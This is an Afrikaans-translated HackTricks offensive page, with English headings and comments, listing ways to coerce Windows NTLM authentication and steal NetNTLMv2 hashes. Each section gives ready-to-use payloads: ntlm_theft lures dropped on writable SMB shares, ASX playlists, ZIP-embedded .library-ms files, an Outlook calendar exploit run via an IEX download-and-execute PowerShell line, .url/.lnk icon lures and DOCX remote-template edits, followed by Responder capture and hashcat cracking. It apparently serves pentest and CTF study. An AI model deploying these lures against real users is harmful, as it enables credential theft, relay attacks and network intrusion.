# Plekke om NTLM creds te steel

{{#include ../../banners/hacktricks-training.md}}

**Kyk na al die goeie idees van [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) van die download van 'n Microsoft Word-lêer aanlyn tot die ntlm leaks source: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md en [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### Skryfbare SMB share + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

As jy kan **skryf na 'n share wat gebruikers of geskeduleerde take in Explorer deurkyk**, plaas lêers waarvan die metadata na jou UNC wys (bv. `\\ATTACKER\share`). Die weergee van die gids aktiveer **implicit SMB authentication** en leaks 'n **NetNTLMv2** aan jou listener.

1. **Genereer lokmiddels** (dek SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Laat hulle op die skryfbare share val** (enige gids wat die slagoffer oopmaak):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Listen and crack**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows kan verskeie lêers gelyktydig benader; enigiets wat Explorer voorskou (`BROWSE TO FOLDER`) vereis geen klikke.

### Windows Media Player playlists (.ASX/.WAX)

As jy 'n teiken kan kry om 'n Windows Media Player-afspeellys wat jy beheer te open of vooraf te kyk, kan jy leak Net‑NTLMv2 deur die item na 'n UNC-pad te wys. WMP sal probeer om die verwysde media oor SMB te haal en sal implisiet autentiseer.

Example payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Versameling en cracking-vloei:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer hanteer .library-ms-lêers onveilig wanneer dit direk vanuit 'n ZIP-argief geopen word. As die biblioteeksdefinisie na 'n afgeleë UNC-pad verwys (bv. \\attacker\share), veroorsaak bloot die blaai of die oopmaak van die .library-ms binne die ZIP dat Explorer die UNC opvra en NTLM-authentisering na die aanvaller uitstuur. Dit lewer 'n NetNTLMv2 op wat offline gekraak kan word of moontlik via relay gebruik kan word.

Minimal .library-ms pointing to an attacker UNC
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operasionele stappe
- Skep die .library-ms-lêer met die XML hierbo (stel jou IP/hostname).
- Zip dit (on Windows: Send to → Compressed (zipped) folder) en lewer die ZIP aan die teiken.
- Start 'n NTLM capture listener en wag dat die slagoffer die .library-ms van binne die ZIP oopmaak.


### Outlook kalenderherinnerings-klankpad (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows het die uitgebreide MAPI-eienskap PidLidReminderFileParameter in kalenderitems verwerk. As daardie eienskap na 'n UNC-pad wys (bv. \\attacker\share\alert.wav), sou Outlook die SMB-share kontak wanneer die herinnering afgaan, leaking die gebruiker se Net‑NTLMv2 sonder enige klik. Dit is op 14 Maart 2023 gepatch, maar dit is steeds uiters relevant vir legacy/ongerakende vloote en vir historiese insidentreaksie.

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Luisteraarskant:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Notes
- 'n slagoffer benodig slegs Outlook for Windows wat aan is wanneer die herinnering afgaan.
- Die leak lewer Net‑NTLMv2 wat geskik is vir offline cracking of relay (nie pass‑the‑hash nie).


### .LNK/.URL ikoon-gebaseerde zero‑click NTLM leak (CVE‑2025‑50154 – omzeiling van CVE‑2025‑24054)

Windows Explorer toon snelkoppeling-ikone outomaties. Onlangse navorsing het getoon dat selfs ná Microsoft se April 2025-patch vir UNC‑ikon-snelkoppelinge dit steeds moontlik was om NTLM-authentisering sonder klikke te veroorsaak deur die snelkoppeling se teiken op 'n UNC-pad te host en die ikoon lokaal te hou (patch-omseiling toegewys CVE‑2025‑50154). Slegs die besigtiging van die vouer laat Explorer metadata van die afgeleë doelwit ophaal en NTLM na die aanvaller se SMB-server uitstuur.

Minimale Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Program-kortpad payload (.lnk) via PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Afleweringsidees
- Sit die snelkoppeling in 'n ZIP en kry die slagoffer om dit te blaai.
- Plaas die snelkoppeling op 'n skryfbare share wat die slagoffer sal oopmaak.
- Kombineer met ander loklêers in dieselfde gids sodat Explorer die items voorkeer.

### Geen-klik .LNK NTLM leak via ExtraData ikonpad (CVE‑2026‑25185)

Windows laai `.lnk` metadata tydens **view/preview** (ikon-rendering), nie net by uitvoering nie. CVE‑2026‑25185 wys 'n parsingspad waar **ExtraData** blokke veroorsaak dat die shell 'n ikonpad oplos en die lêerstelsel aanraak **during load**, wat uitgaande NTLM uitstuur wanneer die pad op afstand is.

Belangrike trigger‑voorwaardes (waargeneem in `CShellLink::_LoadFromStream`):
- Sluit **DARWIN_PROPS** (`0xa0000006`) in ExtraData in (poort na ikon-opdateringsroetine).
- Sluit **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) in met **TargetUnicode** gevul.
- Die laaier brei omgewingsveranderlikes in `TargetUnicode` uit en roep `PathFileExistsW` op die resulterende pad aan.

As `TargetUnicode` oplos na 'n UNC‑pad (bv., `\\attacker\share\icon.ico`), veroorsaak **slegs die kyk na 'n gids** wat die snelkoppeling bevat uitgaande verifikasie. Dieselfde laaipad kan ook deur **indexing** en **AV scanning** getrigger word, wat dit 'n praktiese no‑click leak-oppervlak maak.

Navorsingsgereedskap (parser/generator/UI) is beskikbaar in die **LnkMeMaybe** project om hierdie strukture te bou/inspekteer sonder om die Windows GUI te gebruik.


### Office remote template injection (.docx/.dotm) to coerce NTLM

Office‑dokumente kan na 'n eksterne template verwys. As jy die aangehegte template op 'n UNC‑pad stel, sal die oopmaak van die dokument by SMB verifieer.

Minimale DOCX relationship‑wysigings (binne word/):

1) Wysig word/settings.xml en voeg die aangehegte templateverwysing by:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Wysig word/_rels/settings.xml.rels en wys rId1337 na jou UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Herpak na .docx en lewer. Begin jou SMB capture listener en wag vir die open.

Vir post-capture idees oor relaying of abusing NTLM, kyk:

{{#ref}}
README.md
{{#endref}}


## Verwysings
- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)


{{#include ../../banners/hacktricks-training.md}}
